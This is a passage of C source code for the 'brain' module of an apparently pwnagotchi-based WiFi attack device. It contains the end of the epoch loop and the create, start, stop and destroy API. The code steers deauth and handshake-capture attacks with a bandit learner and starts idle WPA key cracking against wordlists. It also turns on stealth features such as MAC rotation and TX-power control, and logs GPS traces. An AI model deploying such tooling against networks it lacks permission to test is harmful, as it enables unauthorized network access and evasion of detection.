                        ctx->on_handshake(&hs_evt, ctx->callback_user_data);
                    }
                } else {
                    /* No handshake this epoch - penalize attack bandit (#2) */
                    {
                        brain_attack_tracker_t *miss_tracker = get_attack_tracker(ctx, ctx->pending_attack_mac);
                        if (miss_tracker && miss_tracker->last_attack_phase >= 0) {
                            observe_attack_outcome(miss_tracker, miss_tracker->last_attack_phase, false);
                        }
                    }
                    /* No handshake this epoch - small negative for channel */
                    if (ctx->current_channel > 0) {
                        cb_observe(&ctx->channel_bandit, ctx->current_channel, false);
                    }
                }
                ctx->pending_attack_mac[0] = 0;
            }
            ctx->hs_bytes_before_epoch = hs_now;
        }

        { uint64_t _t0 = cpu_act_start();
        brain_epoch_next(ctx);
        brain_update_mood(ctx);
        cpu_act_end(g_health_state, CPU_ACT_EPOCH_END, _t0); }


        /* AUDIT FIX: Check firmware health for MOOD_COOLDOWN */
        if (fw_health_in_cooldown(&ctx->fw_health)) {
            brain_set_mood(ctx, MOOD_COOLDOWN);
        }

        /* HULK RECURRING: If still ANGRY, SMASH again every 5 epochs.
         * First HULK fires on mood transition (in brain_set_mood).
         * Subsequent HULKs fire here while anger persists. */
        if (ctx->mood == MOOD_ANGRY && (ctx->epoch.epoch_num % 5) == 0) {
            fprintf(stderr, "[brain] HULK RECURRING (epoch %d, still ANGRY)\n",
                    ctx->epoch.epoch_num);
            brain_hulk_smash(ctx);
        }

        /* Idle cracking: runs at nice -19, won't impact attacks (HTTP only) */
        if (ctx->crack_mgr) {
            /* Always check for finished crack attempts */
            if (ctx->crack_mgr->state == CRACK_RUNNING) {
                uint64_t _t0 = cpu_act_start();
                if (crack_mgr_check(ctx->crack_mgr)) {
                    fprintf(stderr, "[crack] *** KEY FOUND! ***\n");
                    /* Phase 10: KEY FOUND celebration! DOWNLOAD animation + voice */
                    if (ctx->on_attack_phase) {
                        ctx->on_attack_phase(10, ctx->callback_user_data);
                    }
                }
                cpu_act_end(g_health_state, CPU_ACT_CRACK_CHECK, _t0);
            }
            /* Start new crack when idle and nothing running.
             * Triggers on: bored, lonely, sad, or 3+ inactive epochs */
            if (ctx->crack_mgr->state == CRACK_IDLE &&
                (ctx->mood == MOOD_BORED || ctx->mood == MOOD_LONELY ||
                 ctx->mood == MOOD_SAD || ctx->epoch.inactive_for >= 3) &&
                !crack_mgr_exhausted(ctx->crack_mgr)) {
                crack_mgr_start(ctx->crack_mgr);
                /* Phase 9: Show SMART face + "I feel like getting on the CRACK!" */
                if (ctx->on_attack_phase) {
                    ctx->on_attack_phase(9, ctx->callback_user_data);
                }
            }
        }
        
        /* NOTE: wifi.clear REMOVED - it was wiping bettercap's entire AP list
         * every 10 epochs, causing:
         * 1. All APs to re-fire as "new" (false "Something new!" messages)
         * 2. Potential SDIO bus destabilization from rapid stop/restart
         * 3. Loss of tracking data mid-session
         * Bettercap captures EAPOL for all APs regardless of handshake state.
         * The handshake flag only prevents redundant file writes. */


        /* Phase 2C: Stationary diminishing returns check */
        if (ctx->mobility_ctx.current_mode == MOBILITY_STATIONARY && ctx->stationary.active) {
            if (ctx->epoch.num_shakes > 0) {
                for (int _sc = 0; _sc < ctx->epoch.num_shakes; _sc++)
                    stat_record_capture(&ctx->stationary);
            }
            if (stat_should_permanent_soak(&ctx->stationary)) {
                fprintf(stderr, "[brain] [stationary] Entering permanent passive soak (diminishing returns)\n");
                brain_set_mood(ctx, MOOD_SOAKING);
            }
            /* Check phase expiry and advance */
            if (stat_phase_expired(&ctx->stationary)) {
                stat_phase_t _new_phase = stat_advance_phase(&ctx->stationary);
                fprintf(stderr, "[brain] [stationary] Phase -> %s (circle_back=%d, stale=%d)\n",
                        stat_phase_name(_new_phase),
                        stat_get_circle_back_count(&ctx->stationary),
                        ctx->stationary.consecutive_stale);
                if (_new_phase == STAT_PHASE_SOAK) {
                    brain_set_mood(ctx, MOOD_SOAKING);
                } else if (_new_phase == STAT_PHASE_BURST) {
                    brain_set_mood(ctx, MOOD_HUNTING);
                } else if (_new_phase == STAT_PHASE_CIRCLE) {
                    brain_set_mood(ctx, MOOD_HUNTING);
                    fprintf(stderr, "[brain] [stationary] Circle-back: %d APs with M1 but no M2\n",
                            stat_get_circle_back_count(&ctx->stationary));
                }
            }
            /* Periodic stats dump every 20 epochs */
            if (ctx->epoch.epoch_num % 20 == 0) {
                stat_dump_stats(&ctx->stationary);
            }
        }

        /* Phase 2D: Walking GPS breadcrumb per epoch */
        if (ctx->mobility_ctx.current_mode == MOBILITY_WALKING && ctx->walking.active) {
            if (ctx->gps && ctx->gps->has_fix) {
                walk_breadcrumb(&ctx->walking, ctx->gps->latitude, ctx->gps->longitude,
                               (uint16_t)ctx->total_aps);
            }
            walk_proximity_tick(&ctx->walking);
            /* Periodic stats dump every 20 epochs */
            if (ctx->epoch.epoch_num % 20 == 0) {
                walk_dump_stats(&ctx->walking);
            }
        }

        /* Phase 2B: Driving mode periodic stats at epoch end */
        if (ctx->mobility_ctx.current_mode == MOBILITY_DRIVING && ctx->driving.active) {
            /* Periodic breadcrumb with GPS position */
            if (ctx->gps && ctx->gps->has_fix) {
                /* Already logged per-AP breadcrumbs — this is a sweep-level GPS marker */
            }
            /* Periodic stats dump every 10 epochs (driving epochs are fast) */
            if (ctx->epoch.epoch_num % 10 == 0) {
                drv_dump_stats(&ctx->driving);
            }
        }

        /* AUDIT FIX: Firmware health epoch tick + EAPOL cleanup */
        fw_health_epoch_tick(&ctx->fw_health);
        eapol_monitor_evict_stale(&ctx->eapol_mon);

        /* Garbage collect Thompson brain periodically */
        ts_garbage_collect(ctx->thompson);
        
        /* Prune old history periodically */
        brain_prune_history(ctx);
        
        /* Small sleep to prevent busy loop */
        usleep(100000);  /* 100ms */

epoch_end: ;  /* goto target for conquered-idle shortcut */
    }
    
    fprintf(stderr, "[brain] thread stopped\n");
    return NULL;
}

/* ============================================================================
 * Public API
 * ========================================================================== */

brain_ctx_t *brain_create(const brain_config_t *config, bcap_ws_ctx_t *bcap) {
    brain_ctx_t *ctx = calloc(1, sizeof(brain_ctx_t));
    if (!ctx) return NULL;
    
    /* Copy config */
    ctx->config = *config;

    /* Sprint 6: Initialize stealth state */
    ctx->tx_power_current = config->tx_power_max;
    ctx->geo_fence_active = !config->geo_fence_enabled;  /* Start as inside if fence disabled */
    ctx->last_mac_rotation = time(NULL);
    ctx->mobility_boot_skips = 1;  /* Skip first check (2s at 2s interval) */
    
    /* Copy channels array if provided */
    if (config->channels && config->num_channels > 0) {
        ctx->config.channels = malloc(config->num_channels * sizeof(int));
        if (!ctx->config.channels) {
            free(ctx);
            return NULL;
        }
        memcpy(ctx->config.channels, config->channels,
               config->num_channels * sizeof(int));
    }
    
    /* Set bettercap context */
    ctx->bcap = bcap;
    
    /* Initialize Thompson Sampling brain */
    ctx->thompson = ts_brain_create();
    if (!ctx->thompson) {
        if (ctx->config.channels) free(ctx->config.channels);
        free(ctx);
        return NULL;
    }
    
    /* Try to load saved state */
    ts_load_state(ctx->thompson, "/etc/pwnagotchi/brain_state.bin");

    /* Initialize v3.0 Brain Extension (LinUCB, Windowed Thompson, etc.) */
    ctx->v3 = v3_brain_create();
    if (ctx->v3) {
        if (v3_load_state(ctx->v3, "/var/lib/pwnagotchi/v3_brain.bin") == 0) {
            fprintf(stderr, "[brain] v3.0 brain state loaded\n");
        } else {
            fprintf(stderr, "[brain] v3.0 brain initialized (no saved state)\n");
        }
        /* Try to import PC distillation if available */
        if (v3_distillation_import(ctx->v3, ctx->thompson,
                                   "/tmp/pc_distillation_v3.json") == 0) {
            fprintf(stderr, "[brain] v3.0 PC distillation imported\n");
        }
    } else {
        fprintf(stderr, "[brain] WARNING: v3.0 brain creation failed\n");
    }

    /* Initialize channel bandit (Thompson-based channel selection) */
    cb_init(&ctx->channel_bandit);

    /* Initialize stealth system */
    /* Sprint 6: Create stealth with proper config from brain settings */
    {
        stealth_config_t sconfig = stealth_config_default();
        sconfig.mac_rotation_enabled = config->mac_rotation_enabled;
        sconfig.mac_rotation_interval = config->mac_rotation_interval;
        ctx->stealth = stealth_create(&sconfig, "wlan0mon");
    }
    if (ctx->stealth) {
        fprintf(stderr, "[brain] stealth system initialized\n");
    }
    
    /* Initialize WiFi recovery system */
    ctx->wifi_recovery = wifi_recovery_create(NULL, "wlan0mon", "wlan0");
    if (ctx->wifi_recovery) {
        fprintf(stderr, "[brain] wifi_recovery system initialized\n");
    }

    /* Initialize idle crack manager */
    ctx->crack_mgr = crack_mgr_create();
    if (ctx->crack_mgr) {
        crack_mgr_scan(ctx->crack_mgr);
        fprintf(stderr, "[brain] crack_mgr: %d targets, %d wordlists, %d cracked\n",
                ctx->crack_mgr->num_targets, ctx->crack_mgr->num_wordlists,
                ctx->crack_mgr->total_cracked);
    }
    

    /* AUDIT FIX: Initialize firmware health monitor */
    if (fw_health_init(&ctx->fw_health, "wlan0mon") == 0) {
        extern fw_health_t *g_fw_health;
        g_fw_health = &ctx->fw_health;
        fprintf(stderr, "[brain] firmware health monitor initialized\n");
    } else {
        fprintf(stderr, "[brain] WARNING: firmware health init failed\n");
    }

    /* Initialize mode state */
    /* Sprint 8: Initialize AP Database */
    if (ap_db_init(NULL) == 0) {
        fprintf(stderr, "[brain] AP database initialized\n");
        /* Reconcile DB with files on disk (handshakes + cracked passwords) */
        ap_db_reconcile_files();
    }

    /* Sprint 8: Initialize hash sync */
    hash_sync_init(&config->sync_config);

    ctx->current_mode = MODE_ACTIVE_TARGETING;
    ctx->mode_started = time(NULL);
    ctx->mode_handshakes = 0;
    
    /* Initialize epoch */
    ctx->epoch.epoch_num = 0;
    brain_epoch_reset(&ctx->epoch);
    
    /* Initialize mutex */
    pthread_mutex_init(&ctx->lock, NULL);
    
    /* Initial mood */
    ctx->mood = MOOD_STARTING;
    
    return ctx;
}

void brain_set_health_state(health_state_t *hs) {
    g_health_state = hs;
}

int brain_start(brain_ctx_t *ctx) {
    if (!ctx || ctx->started) return -1;
    
    ctx->running = true;
    ctx->started = true;
    
    int ret = pthread_create(&ctx->thread, NULL, brain_thread_func, ctx);
    if (ret != 0) {
        ctx->running = false;
        ctx->started = false;
        return -1;
    }
    
    return 0;
}

void brain_stop(brain_ctx_t *ctx) {
    if (!ctx || !ctx->running) return;
    
    ctx->running = false;
    pthread_join(ctx->thread, NULL);
}

void brain_destroy(brain_ctx_t *ctx) {
    /* Stop and destroy crack manager */
    if (ctx && ctx->crack_mgr) {
        crack_mgr_destroy(ctx->crack_mgr);
        ctx->crack_mgr = NULL;
    }

    /* Close raw injection socket */
    if (g_raw_sock >= 0) { close(g_raw_sock); g_raw_sock = -1; }

    if (!ctx) return;
    
    brain_stop(ctx);

    /* AUDIT FIX: Stop EAPOL monitor + cleanup fw_health + channel_map */
    eapol_monitor_stop(&ctx->eapol_mon);
    fw_health_destroy(&ctx->fw_health);
    channel_map_destroy(&ctx->channel_map);
    {
        extern fw_health_t *g_fw_health;
        g_fw_health = NULL;
    }

    
    /* Save Thompson brain state before destroying */
    if (ctx->stealth) {
        stealth_destroy(ctx->stealth);
        ctx->stealth = NULL;
    }
    
    if (ctx->wifi_recovery) {
        wifi_recovery_destroy(ctx->wifi_recovery);
        ctx->wifi_recovery = NULL;
    }

    if (ctx->thompson) {
        ts_save_state(ctx->thompson, "/etc/pwnagotchi/brain_state.bin");
        ts_brain_destroy(ctx->thompson);
    }

    /* Save and destroy v3.0 brain */
    if (ctx->v3) {
        v3_save_state(ctx->v3, "/var/lib/pwnagotchi/v3_brain.bin");
        /* Export JSON for PC sync on shutdown */
        if (ctx->thompson) {
            v3_state_export_json(ctx->v3, ctx->thompson,
                                 "/var/lib/pwnagotchi/v3_export.json");
        }
        v3_brain_destroy(ctx->v3);
        ctx->v3 = NULL;
    }

    /* Sprint 8: Close AP database */
    ap_db_close();

    pthread_mutex_destroy(&ctx->lock);
    
    if (ctx->config.channels) {
        free(ctx->config.channels);
    }
    
    if (ctx->history) {
        free(ctx->history);
    }
    
    free(ctx);
}

/* Sprint 8: AP Database stats accessor */
int brain_get_ap_db_stats(ap_db_stats_t *stats) {
    return ap_db_get_stats(stats);
}

brain_mood_t brain_get_mood(brain_ctx_t *ctx) {
    if (!ctx) return MOOD_STARTING;
    return ctx->mood;
}

void brain_get_epoch(brain_ctx_t *ctx, brain_epoch_t *epoch) {
    if (!ctx || !epoch) return;
    
    pthread_mutex_lock(&ctx->lock);
    *epoch = ctx->epoch;
    pthread_mutex_unlock(&ctx->lock);
}

int brain_get_uptime(brain_ctx_t *ctx) {
    if (!ctx || ctx->started_at == 0) return 0;
    return (int)(time(NULL) - ctx->started_at);
}

void brain_set_callbacks(brain_ctx_t *ctx,
    void (*on_mood_change)(brain_mood_t mood, void *user_data),
    void (*on_deauth)(const bcap_ap_t *ap, const bcap_sta_t *sta, void *user_data),
    void (*on_associate)(const bcap_ap_t *ap, void *user_data),
    void (*on_handshake)(const bcap_handshake_t *hs, void *user_data),
    void (*on_epoch)(int epoch_num, const brain_epoch_t *data, void *user_data),
    void (*on_channel_change)(int channel, void *user_data),
    void *user_data)
{
    if (!ctx) return;
    
    ctx->on_mood_change = on_mood_change;
    ctx->on_deauth = on_deauth;
    ctx->on_associate = on_associate;
    ctx->on_handshake = on_handshake;
    ctx->on_epoch = on_epoch;
    ctx->on_channel_change = on_channel_change;
    ctx->callback_user_data = user_data;
}

